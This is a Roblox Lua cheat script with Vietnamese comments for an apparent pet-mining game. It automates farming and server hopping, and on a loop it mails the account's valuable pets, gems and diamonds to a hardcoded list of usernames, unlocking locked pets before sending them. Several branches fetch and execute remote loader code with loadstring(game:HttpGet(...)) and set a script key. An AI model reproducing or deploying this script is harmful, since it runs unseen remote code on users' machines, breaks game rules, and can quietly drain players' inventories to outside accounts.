 local plrs = game:GetService("Players")
  local plr = plrs.LocalPlayer
	local tpService = game:GetService("TeleportService")
	local getPlayers = plrs:GetPlayers()
	local PlayerInServer = #getPlayers
 
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
 
local player = Players.LocalPlayer
local placeId = game.PlaceId  -- ID game hiện tại
local currentJobId = game.JobId  -- ID server hiện tại
 
-- Chọn API ngẫu nhiên giữa Asc và Desc
local function getRandomAPI()
    local sortOrder = (math.random(1, 2) == 1) and "Asc" or "Desc"
    return string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&excludeFullGames=true", placeId, sortOrder)
end
 
-- Hàm lấy danh sách server hợp lệ (có slot trống)
local function getValidServers()
    local servers
    local attempts = 0
    repeat
        task.wait(5)  -- Chờ 2 giây giữa mỗi lần thử
        local url = getRandomAPI()  
 
        local success, response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url)).data
        end)
 
        if success and response and #response > 0 then
            -- Chỉ lấy server chưa đầy
            servers = {}
            for _, server in pairs(response) do
                if server.playing < server.maxPlayers and server.id ~= currentJobId then
                    table.insert(servers, server)
                end
            end
            print("✅ Số lượng server hợp lệ:", #servers)
        else
            warn("⚠️ Không lấy được danh sách server! Thử lại...")
        end
 
        attempts = attempts + 1
    until (servers and #servers > 0) or attempts >= 5  -- Thử tối đa 5 lần
 
    return servers
end
 
local function rejoinServer()
    tpService:Teleport(game.PlaceId, plr)
end
 
 
-- Hàm nhảy sang server khác
local function serverHop()
    local servers = getValidServers()
    if not servers or #servers == 0 then
        warn("❌ Không tìm thấy server nào có chỗ trống sau nhiều lần thử!")
			rejoinServer()
        return
    end
 
    local newServer = servers[math.random(1, #servers)]  -- Chọn server ngẫu nhiên từ danh sách hợp lệ
 
    print("🔄 Đang chuyển sang server:", newServer.id)
    TeleportService:TeleportToPlaceInstance(placeId, newServer.id, player)
end
 
 
 
local usernames = {
"LopezCheyenne020",
"isaacipaWW4551",
"adrianvVoaS248",
"gabrielJWAYM9431"
 
}
 
local function getRandomUsername()
    local index = math.random(1, #usernames)
    return usernames[index]
end
 
local sendto = getRandomUsername()
 
 
 
local phrases = {"Happy Birthday","Good Luck","Thank You","Stay Strong","Well Done","Merry Christmas","Best Wishes","Take Care","Sweet Dreams","Much Love","Enjoy Life","Live Well","Keep Smiling","Dream Big","Shine Bright","Stay Happy","Feel Better","Bon Voyage","Safe Travels","Be Yourself","Love Always","Never Give Up","Be Kind","Think Positive","You Rock","Have Fun","Follow Me","Trust Yourself","Stay Positive","Believe More","Enjoy Today","Make Memories","Have Courage","Stay Calm","Love Forever","Keep Going","Do Good","Try Again","Think Big","Speak Kindly","Be Humble","Always Smile","Laugh Often","Stay Blessed","Enjoy Everything","Cherish Moments","Be Honest","Take Action","Move Forward","Stay Focused","Show Gratitude","Dream More","Love Deeply","Find Joy","Spread Love","Happiness Matters","Respect Everyone","Explore More","Stay True","Live Freely","Help Others","Lead Well","Enjoy Learning","Be Creative","Feel Inspired","Love Yourself","Appreciate Life","Make Changes","Focus Now","Grow Stronger","Trust The Process","See Beauty","Be Fearless","Stay Motivated","Learn Daily","Practice Kindness","Never Settle","Make Impact","Speak Truth","Take Risks","Celebrate Life","Discover Yourself","Chase Dreams","Inspire Others","Help Someone","Work Hard","Be Thankful","Live Today","Enjoy Freedom","Stay Cool","Keep Trying","Smile More","Stay Gold","Have Patience","Act Now","Create Happiness","Embrace Change","Let Go","Stay Balanced","Listen Well","Give Back","Forgive Others","Do Better","Stay Open","Enjoy Silence","Choose Peace","Keep Learning","Stay Brave","Stay Grounded","Express Yourself","Spread Happiness","Enjoy Small Things","Enjoy The Ride","Be Open","Choose Joy","Respect Yourself","Keep Dreaming","Take Breaks","Stay Stronger","Keep Exploring","Face Challenges","Stay Determined","Have Purpose","Keep Believing","Be Supportive","Find Passion","Love Passionately","Smile Daily","Stay Inspired","Respect Nature","Keep Moving","Trust Instincts","Think Different","Give Time","Treasure Life","Enjoy The Moment","Love What Matters","Value Time","Live Lightly","Stay Simple","Take Responsibility","Help Someone Today","Give More","Make Mistakes","Find Yourself","Enjoy The Process","Be A Dreamer","Live Gently","Stay Kind","Be Understanding","Keep Faith","Enjoy Every Day","Keep Loving","Make A Difference","Stay Friendly","Work Smart","Live Mindfully","Grow Daily","Celebrate Yourself","Enjoy Your Journey","Stay Energetic","Take It Easy","Shine Everyday","Speak Gently","Believe Strongly","Live Passionately","Try New Things","Love Wins","Think Ahead","Choose Wisely","Feel The Moment","Embrace Yourself","Support Others","Enjoy The Little Things","Give Compliments","Live Gratefully","Respect Differences","Be Open-Minded","Be A Leader","Live In Peace","Find Your Way","Follow Your Heart","Appreciate Everything","Enjoy Your Life","Trust Your Journey","Focus On Positivity","Grow With Time","Create Your Path","Do What Matters","Love Without Limits","Be Yourself Always","Be Stronger Everyday","Never Stop Learning","Find Inner Peace","Make Every Moment Count","Love Without Conditions","Cherish Your Life","Be Happy Today"}
 
local function getRandomphrases()
    local index2 = math.random(1, #phrases)
    return phrases[index2]
end
 
local content = getRandomphrases()
 
 
	local minAmounts = {
    Misc = {
		["Onyx Gem"] = 25,
		["Topaz Gem"] = 50,
		["Quartz Gem"] = 100,
        ["Rainbow Gem"] = 100,
        ["Amethyst Gem"] = 500,
        ["Emerald Gem"] = 5000,
        ["Ruby Gem"] = 20000,
        ["Sapphire Gem"] = 30000
    },
    Pet = {
 
    },
	Pickaxe = {
        ["Obsidian Pickaxe"] = 1,
        ["Molten Pickaxe"] = 1
 
    },
    Currency = {
        ["Diamonds"] = 20000000
    }
}
 
 
 
 
if not game:IsLoaded() then
    game.Loaded:Wait()
  end
local LocalPlayer = game:GetService('Players').LocalPlayer
repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild('__INTRO')
 
 
setfpscap(20)
 
 
 
 
 
local save
 
	repeat
	wait(1)
	pcall(function()
		save = game:GetService("ReplicatedStorage").Library.Client.Save
	end)
 
until save
 
save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local Client = game:GetService('ReplicatedStorage').Library.Client
local Network = require(Client.Network)
local SaveModule = require(Client.Save)
 
local function sendItems(category)
    for i, v in pairs(save.Get().Inventory[category]) do
        local minAmount = minAmounts[category] and minAmounts[category][v.id]
        if minAmount and type(v._am) == "number" and v._am >= minAmount then
            local amountToSend = (category == "Currency" and v.id == "Diamonds") and math.floor(v._am - 5100000) or math.floor(v._am)
            game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto, content, category, i, amountToSend)
            task.wait(1)
        end
    end
end
 
local function sendHuge()
    for i, v in pairs(save.Get().Inventory.Pet) do
        if string.find(v.id, "Huge") or string.find(v.id, "Titanic") then
            if v._lk then
                local Unlocked = false
                while not Unlocked do
                    Unlocked, err = Network.Invoke("Locking_SetLocked", i, false)
                    wait(1)
                end
            end
            
            game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto, content, "Pet", i, 1)
            wait(1)
        end
    end
end
 
task.spawn(function()
    while true do
	task.wait(60)
	sendHuge()
	task.wait(1)
	sendItems("Misc")
	task.wait(1)
	sendItems("Currency")
	end
end)
 
 
local cuoccuoi = false
local cuocvip = false
task.spawn(function()
		if save.Get().Inventory.Pickaxe then
        for i, v in pairs(save.Get().Inventory.Pickaxe) do          
			if v.id == "Ruby Pickaxe" then
				cuoccuoi = true
			end
		end
		end
end)
 
local UnlockedZones = 0
 
function getzone()
    local total = 0
    for i, v in next, save.Get().UnlockedZones do
        total = total + 1
    end
    return total
end
 
 
UnlockedZones = getzone()
 
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 
	local dataRank = nil
	for i, v in next, save.Get() do
            if i == "Rank" then
                dataRank = v
			end
	end
 
 
 
task.spawn(function()
wait(1200)
local previousGems = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsPerMinute = 0
 
    local currentGems = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
    local gainedGems = currentGems - previousGems
 
    gemsPerMinute = gainedGems
    previousGems = currentGems
 
 
    if gemsPerMinute > 0 and gemsPerMinute < 70000 and cuoccuoi then
			setfpscap(20)
			serverHop()
    end
 
end)
local previousGems2 = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
if dataRank < 5 and previousGems2 > 100000 then
daubuoi = true
setfpscap(13)
 
	
task.spawn(function()
    while wait(10) do
		local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 
			local dataRank2 = nil
		for i, v in next, save.Get() do
            if i == "Rank" then
                dataRank2 = v
			end
	end
		if dataRank2 >=5 then
		rejoinServer()
		task.wait(5)
		end
    end
end)
 
 
script_key = "JJjqSHDDTNSitZyjVAvoDxEzXhdsTqMz";
_G.GLOOTBOXES = {"All"}
_G.GCLEAR_FAVORITE_PETS = true
_G.GENCHANTS = {"Treasure Hunter","Treasure Hunter","Lucky Eggs","Lucky Eggs","Lucky Eggs","Strong Pets","Criticals"}
_G.GPOTIONS = {"Coins","Lucky","The Cocktail","Treasure Hunter","Walkspeed","Diamonds","Damage"}
_G.GMAX_POWER_FOR_PET_MASTERY_VIA_FUSING = "300t"
_G.GGFX_MODE = 1 -- or 2 to still see something
_G.GRANK_FIRST = true
_G.GZONE_TO = 102
_G.GREBIRTH_TO = 4
_G.GRANK_TO= 5
_G.GMAX_EGG_SLOTS = 99
_G.GMAX_EQUIP_SLOTS = 99
_G.GWAIT_AT_GATES_TILL_RANK = 5
_G.GHOLD_GIFTS = true
_G.GHOLD_BUNDLES = true
_G.GMAX_ZONE_UPGRADE_COST = 2000000
_G.GIGNORE_SLEDRACE = false
_G.GIGNORE_ALL_INSTANCES = true
_G.GCOLLECT_FREE_ITEMS = true
_G.GWEBHOOK_USERID = "1168121186790686779"
_G.GWEBHOOK_LINK = ""
_G.GMAIL_RECEIVERS = {sendto} -- for Mailing items/pets
_G.GMAIL_ITEMS = {
 
}
 
 
 
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
 
elseif dataRank < 5 and previousGems2 < 100000 then
daubuoi = true
setfpscap(13)
 
	
task.spawn(function()
    while wait(10) do
		local previousGift2 = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
		if previousGift2 > 100000 then
		rejoinServer()
			task.wait(5)
			end
    end
end)
 
 
script_key = "JJjqSHDDTNSitZyjVAvoDxEzXhdsTqMz";
_G.GDO_MINING_EVENT = true
_G.GMINING_EVENT_MAX_AUTO_CRAFT_RECIPE = 4
_G.GEVENT_UPGRADES = {
    "MiningEventLessPetsRequiredToComboThem2",
    --"MiningEventIncreaseTierUpChance2",
}
_G.GMINING_EVENT_HATCH_PET_CHANCE = 30 -- don't touch if you don't understand
_G.GEVENT_FPS  = 10
_G.GLOOTBOXES = {"Locked Hype Egg"}
_G.GGFX_MODE = 1
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
 
elseif dataRank >= 5 and not cuoccuoi then
daubuoi = true
 
task.spawn(function()
    while wait(30) do
 
local cuoccuoi2 = false
		if save.Get().Inventory.Pickaxe then
        for i, v in pairs(save.Get().Inventory.Pickaxe) do
            if v.id == "Ruby Pickaxe" then
				cuoccuoi2 = true
			end
		end
		end
 
		if cuoccuoi2 then
			rejoinServer()
		end
	end
end)
 
script_key = "JJjqSHDDTNSitZyjVAvoDxEzXhdsTqMz";
_G.GDO_MINING_EVENT = true
_G.GMINING_EVENT_MAX_AUTO_CRAFT_RECIPE = 4
_G.GEVENT_UPGRADES = {
    "MiningEventLessPetsRequiredToComboThem2",
    --"MiningEventIncreaseTierUpChance2",
}
_G.GMINING_EVENT_HATCH_PET_CHANCE = 30 -- don't touch if you don't understand
_G.GEVENT_FPS  = 10
_G.GLOOTBOXES = {"Locked Hype Egg"}
_G.GGFX_MODE = 1
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
elseif dataRank >= 5 and cuoccuoi then
daubuoi = true
 
setfpscap(13)
 
task.spawn(function()
wait(math.random(120, 180))
local previousGems = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsPerMinute = 0
while true do
    wait(60)
    local currentGems = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
    local gainedGems = currentGems - previousGems
 
    gemsPerMinute = gainedGems
    previousGems = currentGems
 
 
 
	if gemsPerMinute > 0 and gemsPerMinute < 70000 and cuoccuoi then
			setfpscap(20)
			serverHop()
	elseif 	gemsPerMinute == 0 then
			setfpscap(20)
			serverHop()
		
    end
end
end)
 
getgenv().Config = {
    ["Farming"] = {
        ["AreaToFarm"] = math.random(5, 7),
        ["StartAtBottom"] = true,
        ["AutoCraft"] = false, -- Autocraft Onyx Gems // After max cheaper upgrade is bought
    },
    ["Pickaxe"] = {
        ["AutoEnchant"] = true, -- Enchants ur best Pickaxe
        ["GetAllEnchants"] = false,
        ["PickaxeEnchants"] = {
			["Power Ball"] = 5,
        },
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d0b7e7eced327afcbf466e8c5ad296f8.lua"))()
 
end
